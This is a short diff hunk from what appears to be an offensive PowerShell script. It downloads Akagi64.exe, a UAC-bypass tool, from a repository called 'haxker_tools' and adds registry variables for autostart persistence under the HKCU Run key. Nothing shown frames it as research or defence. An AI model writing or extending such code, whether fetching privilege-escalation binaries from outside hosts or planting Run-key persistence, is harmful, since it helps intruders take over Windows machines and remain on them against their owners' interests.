@@ -115,6 +115,9 @@ $UACMEUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads
 $UACMEPath = "C:\uptm\Akagi64.exe"
 Write-Host "Downloading Akagi64.exe..."
 
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$valueName = "AutoHostScript"
+
 try {
     Invoke-WebRequest -Uri $UACMEUrl -OutFile $UACMEPath -UseBasicParsing -ErrorAction Stop
     
